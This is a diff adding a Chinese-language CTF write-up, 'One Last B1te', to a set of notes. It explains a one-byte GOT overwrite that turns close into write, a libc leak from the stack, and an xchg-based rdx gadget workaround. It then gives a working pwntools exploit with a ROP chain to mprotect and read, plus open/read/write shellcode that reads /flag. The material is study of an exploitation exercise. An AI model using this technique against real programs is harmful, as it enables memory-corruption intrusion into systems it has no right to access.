@@ -350,3 +350,93 @@ shellcode中最关键的是借助cx寄存器生成syscall的一段，其他部�
 - 可以不使用reread，而是直接尝试execve
 
 ## week3
+### One Last B1te
+观察大佬的wp，能从中学到很多很好的pwn习惯；比如拿到二进制文件先seccomp观察沙箱；checksec观察保护机制等等<br>
+这道题关键在于 Partial RELRO + 一字节任意写，使得我们可以修改got表的函数地址来执行我们想要的函数
+```c
+int __fastcall main(int argc, const char **argv, const char **envp)
+{
+  void *buf; // [rsp+8h] [rbp-18h] BYREF
+  char v5[16]; // [rsp+10h] [rbp-10h] BYREF
+
+  init(argc, argv, envp);
+  sandbox();
+  write(1, "Show me your UN-Lucky number : ", 0x20uLL);
+  read(0, &buf, 8uLL);
+  write(1, "Try to hack your UN-Lucky number with one byte : ", 0x32uLL);
+  read(0, buf, 1uLL);
+  read(0, v5, 0x110uLL);
+  close(1);
+  return 0;
+}
+```
+在程序执行的最后`close(1)`关闭了标准输出流，正常思路来讲拥有这么大的溢出空间就会想到去ret2libc，但由于关闭了标准输出流导致泄露不了libc基址。此时应该想到我们可以1地址任意写，于是正好将close函数的got表地址重定向为其他函数。<br>
+非常棒的是由于执行`close`函数之前才刚刚执行过read函数，此时参数依然残留在寄存器中，对其善加利用就可以想到`write`函数正好能利用上这些参数，将v5及其栈上的内容泄露出来。<br>
+除此之外，还需要注意的是：
+> 程序在新版Ubuntu24下编译，优化掉了CSU，此时我们很难利用ELF的gadget来ROP<br>
+
+于是这里就只能利用`close`改`write`泄露栈内容来泄露libc，而不能调用`write`手动传参来泄露libc了<br>
+__新知识点__：
+1. 通过泄露栈上的`libc_start_main`函数地址从而获取libc基地址<br>
+程序运行流程：`libc_start_main` -> `main` -> `libc_start_main`
+因此当我们可以将栈中内容泄露时，如果泄露的范围比较大，就可以将`libc_start_main`函数中的某个偏移地址泄露出来，那么<br>
+```python
+libc_base = address - offset - libc_start_main_addr
+```
+拿到了libc基址后，再次考虑沙箱的问题。沙箱禁止了execve的执行，所以我们无法执行system拿到shell，只能考虑orw。<br>
+做过这道题之后，获取libc基址的方法又多了一种：泄露栈内容来泄露libc<br>
+
+2. glibc 2.39下，难以拿到rdx的gadget，代替方案：`pop rax` + `xchg eax, edx`<br>
+`xchg`指令用于交换两个操作数的内容<br>
+> `xchg`指令还有一个特点，那就是只占一个字节。这在许多高度限制shellcode长度的场景下非常有用<br>
+
+exp:
+```python
+from pwn import *
+context(arch='amd64', os='linux', log_level='debug')
+elf = ELF("./pwn")
+libc = elf.libc
+local = 0
+if local == 0:
+    sh = remote("172.25.128.1", 56867)
+else:
+    sh = process("./pwn")
+    gdb.attach(sh, "b main")
+main = 0x4013a3
+ret = 0x40101a
+sh.sendafter(b"number ", p64(0x404028))
+sh.sendafter(b"byte", b"\x50")
+payload = cyclic(0x10+8) + p64(ret) + p64(main)
+sh.sendline(payload)
+print(sh.recv(0x10))
+print(sh.recv(0xb8))
+libc_offset = u64(sh.recv(8).ljust(8, b'\x00'))
+libc_base = libc_offset - (0x77f0dcc2a28b - 0x77f0dcc00000)
+print(hex(libc_base))
+
+pop_rsi = libc_base + 0x110a4d
+pop_rdi = libc_base + 0x10f75b
+pop_rax = libc_base + 0xdd237
+xchg_edx_eax = libc_base + 0xb229e #xchg edx, eax ; mov eax, 0xf7000000 ; ret 0
+mprotect = libc_base + libc.symbols["mprotect"]
+read = libc_base + libc.symbols["read"]
+shellcode_addr = 0x401000 #直接拿代码段来用
+
+payload = cyclic(0x10 + 8) + p64(pop_rdi) + p64(shellcode_addr)
+payload += p64(pop_rsi) + p64(0x1000) + p64(pop_rax) + p64(7) + p64(xchg_edx_eax) + p64(mprotect) #mrpotect改权限
+payload += p64(pop_rdi) + p64(0) + p64(pop_rsi) + p64(shellcode_addr) + p64(pop_rax) + p64(0x1000) + p64(xchg_edx_eax) + p64(read)
+payload += p64(shellcode_addr)
+sh.sendafter(b"number ", p64(0x404028))
+sh.sendafter(b"byte", b"\x50")
+sh.sendline(payload)
+
+
+shellcode = asm(shellcraft.open('/flag',0,0))
+shellcode += asm(shellcraft.read('rax',shellcode_addr + 0x800,0x100))
+shellcode += asm(shellcraft.write(2,shellcode_addr + 0x800,'rax'))
+pause()
+sh.sendline(shellcode)
+
+sh.interactive()
+```
+### 不思議なscanf
